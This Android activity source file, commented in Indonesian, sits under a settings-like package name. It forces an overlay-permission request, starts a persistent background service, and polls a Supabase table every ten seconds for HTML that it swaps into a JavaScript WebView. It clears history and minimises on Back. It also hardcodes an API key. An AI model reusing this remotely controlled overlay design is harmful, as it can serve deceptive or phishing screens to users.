package com.settings.datasecure;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    
    private WebView webView;
    private static final int KODE_IZIN_OVERLAY = 1234;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String htmlUtamaTerakhir = ""; 
    
    // FLAG BARU: Penanda kapan riwayat halaman harus dihapus
    private boolean bersihkanRiwayat = false; 

    private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.1&select=html_content";
    private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Mohon izinkan aplikasi tampil di atas aplikasi lain", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, KODE_IZIN_OVERLAY);
        } else {
            tampilkanLayarUtama();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == KODE_IZIN_OVERLAY) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    tampilkanLayarUtama();
                } else {
                    tampilkanLayarUtama();
                }
            }
        }
    }

    private void tampilkanLayarUtama() {
        try {
            Intent intentOverlay = new Intent(this, LayananBackground.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intentOverlay); 
            } else {
                startService(intentOverlay);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        webView = new WebView(this);
        setContentView(webView);

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE); 
        
        // --- PERBAIKAN: MENGHAPUS RIWAYAT WEB ---
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Begitu HTML baru selesai dimuat ke layar, hapus ingatan HTML lama!
                if (bersihkanRiwayat) {
                    view.clearHistory(); 
                    bersihkanRiwayat = false;
                }
            }
        });
        
        webView.setBackgroundColor(Color.parseColor("#111827"));

        final SharedPreferences memori = getSharedPreferences("DataSecureCache", MODE_PRIVATE);
        htmlUtamaTerakhir = memori.getString("html_utama", "");
        
        if (!htmlUtamaTerakhir.isEmpty()) {
            bersihkanRiwayat = true; // Tandai agar riwayat dihapus
            webView.loadDataWithBaseURL(null, htmlUtamaTerakhir, "text/html", "UTF-8", null);
        }

        Runnable sistemPemantauUtama = new Runnable() {
            @Override
            public void run() {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL(URL_SUPABASE);
                            HttpURLConnection koneksi = (HttpURLConnection) url.openConnection();
                            koneksi.setRequestMethod("GET");
                            koneksi.setRequestProperty("apikey", KUNCI_SUPABASE);
                            koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                            koneksi.setRequestProperty("Accept", "application/json");
                            
                            koneksi.setUseCaches(false);
                            koneksi.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate");
                            koneksi.setRequestProperty("Pragma", "no-cache");
                            koneksi.setRequestProperty("Expires", "0");

                            if (koneksi.getResponseCode() == 200) {
                                BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
                                StringBuilder response = new StringBuilder();
                                String baris;
                                while ((baris = in.readLine()) != null) {
                                    response.append(baris);
                                }
                                in.close();

                                JSONArray dataJson = new JSONArray(response.toString());
                                if (dataJson.length() > 0) {
                                    JSONObject barisData = dataJson.getJSONObject(0);
                                    final String htmlBaru = barisData.getString("html_content");

                                    if (!htmlBaru.equals(htmlUtamaTerakhir)) {
                                        htmlUtamaTerakhir = htmlBaru;
                                        memori.edit().putString("html_utama", htmlBaru).apply();
                                        
                                        handler.post(new Runnable() {
                                            @Override
                                            public void run() {
                                                bersihkanRiwayat = true; // Tandai agar riwayat dihapus lagi saat HTML update selesai
                                                webView.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
                                            }
                                        });
                                    }
                                }
                            }
                            koneksi.disconnect();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
                
                handler.postDelayed(this, 10000); 
            }
        };
        handler.post(sistemPemantauUtama);
    }

    @Override
    public void onBackPressed() {
        // Karena riwayat halaman sebelumnya sudah dihapus oleh 'clearHistory', 
        // webView.canGoBack() akan bernilai salah (false) untuk HTML lama.
        // HP akan langsung melempar aplikasi ke belakang (Minimize) melalui moveTaskToBack.
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            moveTaskToBack(true);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}
